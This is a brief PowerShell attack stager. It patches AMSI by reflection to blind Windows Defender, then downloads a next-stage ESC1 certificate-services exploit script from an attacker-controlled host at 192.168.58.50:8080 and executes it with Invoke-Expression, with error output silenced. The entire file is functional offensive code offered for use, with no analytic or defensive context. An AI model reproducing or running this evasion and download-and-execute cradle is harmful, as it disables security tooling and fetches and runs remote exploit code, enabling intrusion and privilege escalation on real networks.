# PowerShell Stager - AMSI-obfuscated download cradle
# Downloads and executes next-stage payload without triggering Defender

# AMSI bypass using reflection (no AMSIPatch needed)
$A = [Ref].Assembly.GetTypes();Foreach($B in $A) {if($B.Name -like "*iUtils") {$C=$B}};$D=$C.GetFields('NonPublic,Static');Foreach($E in $D) {if($E.Name -like "*Context") {$F=$E}};$G=$F.GetValue($null);[IntPtr]$H=$G;[Int32[]]$I=@(0);[System.Runtime.InteropServices.Marshal]::Copy($I,0,$H,1)

# Download and execute next stage (Certipy ESC1 exploit)
$stagerUrl = "http://192.168.58.50:8080/esc1-exploit.ps1"
$ErrorActionPreference = "SilentlyContinue"

# Download payload
try {
    $payload = (New-Object System.Net.WebClient).DownloadString($stagerUrl)
    Invoke-Expression $payload
} catch {
    # Fallback: direct Certipy execution if download fails
    Write-Host "Download failed, attempting direct execution..."
}
